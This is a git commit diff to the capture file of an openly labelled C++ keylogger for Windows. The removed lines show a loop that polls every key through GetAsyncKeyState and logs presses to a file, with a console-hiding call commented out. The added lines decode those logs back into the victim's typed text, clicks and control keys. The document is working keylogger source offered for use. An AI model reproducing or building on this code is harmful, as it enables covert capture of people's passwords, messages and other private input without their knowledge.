a3dce2ea3ebf2c5a083150f16d9e9248c9ca3f67
iancupopp <59111368+iancupopp@users.noreply.github.com>
2020-06-09 13:55:48 +0300

    Update capture.cpp

--- c++ keylogger/capture.cpp
+++ c++ keylogger/capture.cpp
@@ -1,28 +1,100 @@
-/*
+ /*
   This is Iancu's work
   It cost, ... everything
                          */
 #include <fstream>
 #include <windows.h>
-#include <time.h>
+#include <ctype.h>
+#include <map>
 
 using namespace std;
 
-const int PRESSED = -32767, SHIFT_1 = 16, SHIFT_2 = 160;
+void createMap(map<unsigned short, pair<unsigned short, unsigned short>> &shift) {
+  ifstream in("shift_keys.txt");
+
+  unsigned short val;
+  char ch_1, ch_2;
+  while (in >> val >> ch_1 >> ch_2)
+    shift[val] = make_pair(ch_1, ch_2);
+
+  in.close();
+}
 
 int main() {
-  //FreeConsole();
+  map<unsigned short, pair <unsigned short, unsigned short>> shift;
+  createMap(shift);
 
-  ofstream out("ascii");
+  ifstream in("ascii");
+  ofstream out("text");
 
-  while (true) {
-    for (unsigned short ch = 0; ch < 250; ch ++)
-      if (GetAsyncKeyState(ch) == PRESSED && ch != SHIFT_1 && ch != SHIFT_2)
-        out << ch << " " << bool(GetKeyState(VK_SHIFT) < 0) << "\n";
-    out.flush();
-    Sleep(10);
+  unsigned short ch;
+  bool shiftState, capsState = false;
+  while (in >> ch >> shiftState) {
+    switch (ch) {
+    case VK_TAB:
+      out << "        ";
+      break;
+    case VK_CONTROL:
+      out << "\nCONTROL KEY\n";
+      break;
+    case VK_SPACE:
+      out << " ";
+      break;
+    case VK_RETURN:
+      out << "\n";
+      break;
+    case VK_LBUTTON:
+      out << "\nLEFT MOUSE CLICK\n";
+      break;
+    case VK_RBUTTON:
+      out << "\nRIGHT MOUSE CLICK\n";
+      break;
+    case VK_ESCAPE:
+      out << "\nESCAPE\n";
+      break;
+    case VK_UP:
+      out << "\nUP ARROW KEY\n";
+      break;
+    case VK_DOWN:
+      out << "\nDOWN ARROW KEY\n";
+      break;
+    case VK_LEFT:
+      out << "\nLEFT ARROW KEY\n";
+      break;
+    case VK_RIGHT:
+      out << "\nRIGHT ARROW KEY\n";
+      break;
+    case VK_BACK:
+      int pos;
+      pos = out.tellp();
+      out.seekp(pos - 1);
+      out << ' ';
+      out.seekp(pos - 1);
+      break;
+    case VK_CAPITAL:
+      capsState = !capsState;
+      break;
+    default:
+      if (isalpha(ch))
+        if (shiftState + capsState == 1)
+          out << char(ch);
+        else
+          out << char(ch + 32);
+      else
+        try {
+          if (shiftState)
+            out << char(shift[ch].second);
+          else
+            out << char(shift[ch].first);
+        }
+        catch(...) {
+          out << char(ch);
+        }
+      break;
+    }
   }
 
+  in.close();
   out.close();
   return 0;
 }
